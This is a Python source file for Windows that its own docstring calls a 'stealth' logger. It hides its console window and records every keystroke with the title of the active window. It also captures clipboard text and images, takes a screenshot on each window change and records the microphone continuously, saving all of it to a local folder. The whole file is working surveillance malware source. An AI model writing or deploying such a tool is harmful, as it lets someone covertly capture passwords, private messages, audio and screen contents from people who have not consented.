"""
full_logger.py  –  Stealth key + clipboard (text & image) logger
────────────────────────────────────────────────────────────────
• Keystrokes in one line, window headers on change
• Clipboard text   → logged
• Clipboard image  → saved as PNG + logged
• Screenshots on window change (one session folder per run)
• Stop with ESC
"""

import os, io, time, ctypes, hashlib
from datetime import datetime
from threading import Thread
import threading
import sounddevice as sd
import soundfile as sf

from pynput import keyboard
import win32gui, win32process, win32clipboard
import psutil
from PIL import Image, ImageGrab

# ── Configuration ──────────────────────────────────────────────────
LOG_DIR  = r"C:\Users\asus\keylogger"
CLIPBOARD_POLL_INTERVAL = 1.5     # seconds

# ── Create session folders ─────────────────────────────────────────
start_time  = datetime.now()
day_folder  = os.path.join(LOG_DIR, start_time.strftime("%Y-%m-%d"))
session_dir = os.path.join(day_folder, start_time.strftime("%H-%M-%S"))
os.makedirs(session_dir, exist_ok=True)

LOG_FILE = os.path.join(LOG_DIR, "system_log.txt")   # text log stays at root

# Hide console window (comment next line while debugging)
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# ── Helpers ─────────────────────────────────────────────────────────
def get_active_window() -> str:
    """Return '[exe – window title]' for the foreground window."""
    try:
        hwnd  = win32gui.GetForegroundWindow()
        pid   = win32process.GetWindowThreadProcessId(hwnd)[1]
        exe   = psutil.Process(pid).name()
        title = win32gui.GetWindowText(hwnd)
        return f"[{exe} – {title}]"
    except Exception as e:
        return f"[Unknown Window – {e}]"

def get_active_window_info():
    """Returns hwnd, formatted window info string."""
    try:
        hwnd = win32gui.GetForegroundWindow()
        pid  = win32process.GetWindowThreadProcessId(hwnd)[1]
        exe  = psutil.Process(pid).name()
        title = win32gui.GetWindowText(hwnd)
        return hwnd, f"[{exe} – {title}]"
    except Exception as e:
        return None, f"[Unknown Window – {e}]"

def save_screenshot(window_title: str):
    """Grab a screenshot, save it in the session folder, log in main + summary files."""
    try:
        now      = datetime.now()
        ts       = now.strftime("%H%M%S")
        img_name = f"screenshot_{ts}.png"
        img_path = os.path.join(session_dir, img_name)
        
        ImageGrab.grab().save(img_path, "PNG")

        # Main log entry
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"\n[{now}] 📸 Screenshot saved → {img_path}\n")

        # Summary file entry
        summary_file = os.path.join(session_dir, "screenshot_summary.txt")
        with open(summary_file, "a", encoding="utf-8") as f:
            f.write(f"[{now}] Screenshot → {img_name} | Window: {window_title}\n")

    except Exception as e:
        print(f"[!] Screenshot error: {e}")
        
        
        # ── AUDIO RECORD ────────────────────────────────────────

def record_audio_loop(duration=60):
    """Continuously record audio in chunks (duration in seconds) and save to disk."""
    fs = 44100  # Sample rate
    print("[+] Voice recorder running...")  # Will not be visible if console is hidden

    while True:
        try:
            now = datetime.now()
            ts = now.strftime("%H%M%S")
            filename = os.path.join(session_dir, f"mic_{ts}.wav")

            # Record audio
            audio = sd.rec(int(duration * fs), samplerate=fs, channels=1, dtype='int16')
            sd.wait()  # Wait until recording is finished

            # Save as WAV
            sf.write(filename, audio, fs)
            
            # Log entry
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(f"\n[{now}] 🎤 Audio recorded → {filename}\n")

        except Exception as e:
            print(f"[!] Audio record error: {e}")

# ── Clipboard watcher thread ────────────────────────────────────────
last_clip_txt  = ""
last_clip_hash = None

def clipboard_watcher():
    global last_clip_txt, last_clip_hash
    print("[+] Clipboard watcher running...")  # Visible only when console is not hidden
    while True:
        time.sleep(CLIPBOARD_POLL_INTERVAL)

        # ----- Text Clipboard --------------------------------------------------
        try:
            win32clipboard.OpenClipboard()
            if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
                txt = win32clipboard.GetClipboardData()
                if txt and txt != last_clip_txt:
                    last_clip_txt = txt
                    with open(LOG_FILE, "a", encoding="utf-8") as f:
                        f.write(f"\n\n[{datetime.now()}] 📋 Copied text:\n{txt}\n")
            win32clipboard.CloseClipboard()
        except Exception as e:
            print(f"[!] Clipboard‑text error: {e}")

        # ----- Image Clipboard -------------------------------------------------
        try:
            img = ImageGrab.grabclipboard()  # Handles most image formats
            if isinstance(img, Image.Image):
                img_hash = hashlib.md5(img.tobytes()).hexdigest()
                if img_hash != last_clip_hash:
                    last_clip_hash = img_hash
                    ts = datetime.now().strftime("%H%M%S")
                    img_path = os.path.join(session_dir, f"clip_{ts}.png")
                    img.save(img_path, "PNG")
                    with open(LOG_FILE, "a", encoding="utf-8") as f:
                        f.write(f"\n\n[{datetime.now()}] 📸 Image copied → {img_path}\n")
        except Exception as e:
            print(f"[!] Clipboard‑image error: {e}")

# ── Session header ─────────────────────────────────────────────────
with open(LOG_FILE, "a", encoding="utf-8") as f:
    f.write(f"\n\n--- Logging started: {start_time} ---\n")

# ── Keylogger Callbacks ────────────────────────────────────────────

last_hwnd = None

def on_press(key):
    global last_hwnd

    # Detect window change → log header and take a screenshot
    hwnd, win_info = get_active_window_info()
    if hwnd != last_hwnd:
        last_hwnd = hwnd
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"\n\n{datetime.now()} {win_info}\n")
        threading.Thread(
            target=save_screenshot,
            args=(win_info,),
            daemon=True
        ).start()

    # Convert key to printable string
    try:
        k = key.char or ""
    except AttributeError:
        special = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "\n",
            keyboard.Key.tab:   "\t",
        }
        k = special.get(key, f"[{key.name.upper()}]")

    # Append the key to the log file
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(k)

def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop listener if ESC is pressed

# ── Launching Clipboard Watcher and Key Listener ──────────────────
Thread(target=record_audio_loop, daemon=True).start()

Thread(target=clipboard_watcher, daemon=True).start()

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
